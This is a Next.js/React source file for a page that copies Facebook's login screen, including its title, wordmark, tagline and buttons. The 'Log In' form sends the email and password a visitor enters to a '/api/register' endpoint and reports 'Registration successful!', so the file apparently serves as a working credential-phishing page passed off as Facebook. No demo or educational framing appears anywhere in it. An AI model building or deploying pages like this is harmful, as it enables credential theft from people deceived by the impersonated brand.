// pages/index.tsx
'use client';
import { useState } from 'react';
import Head from 'next/head';

export default function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setMessage(''); // Reset message

    try {
      const res = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      const data = await res.json();

      if (!res.ok) {
        setMessage(data.error || 'Something went wrong.');
      } else {
        setMessage('Registration successful!');
        setEmail('');
        setPassword('');
      }
    } catch (err) {
      console.log(err);
      setMessage('Server error. Please try again.');
    }
  };

  return (
    <>
      <Head>
        <title>Facebook – log in or sign up</title>
      </Head>

      <div className='bg-gray-100'>
        <div className='container h-screen flex items-center w-full justify-between'>
          <div className='flex flex-col lg:flex-row items-center justify-between w-full px-4'>
            {/* Left Side */}
            <div className='mb-10 lg:mb-0 lg:w-1/2'>
              <h1 className='text-primary text-6xl font-bold mb-4'>facebook</h1>
              <p className='text-3xl'>Connect with friends and the world around you on Facebook.</p>
            </div>

            {/* Right Side - Login Form */}
            <div className='w-full max-w-sm'>
              <div className='bg-white p-6 rounded-lg shadow-md'>
                <form className='flex flex-col space-y-4' onSubmit={handleSubmit}>
                  <input
                    type='email'
                    placeholder='Email or phone number'
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    className='p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500'
                  />
                  <input
                    type='password'
                    placeholder='Password'
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    className='p-3 border border-primary rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500'
                  />
                  <button
                    type='submit'
                    className='bg-blue-600 text-white py-2 rounded-md font-bold hover:bg-blue-700 text-2xl'
                  >
                    Log In
                  </button>
                  {message && <p className='text-center text-sm text-red-600'>{message}</p>}
                  <a href='#' className='text-center text-blue-600 hover:underline'>
                    Forgotten password?
                  </a>
                  <hr className='my-2' />
                  <button
                    type='button'
                    className='bg-green-500 text-white py-3 rounded-md font-bold hover:bg-green-600 mx-auto w-fit px-6 mt-4'
                  >
                    Create New Account
                  </button>
                </form>
              </div>
              <p className='text-sm text-center mt-4'>
                <span className='font-bold'>Create a Page</span> for a celebrity, brand or business.
              </p>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
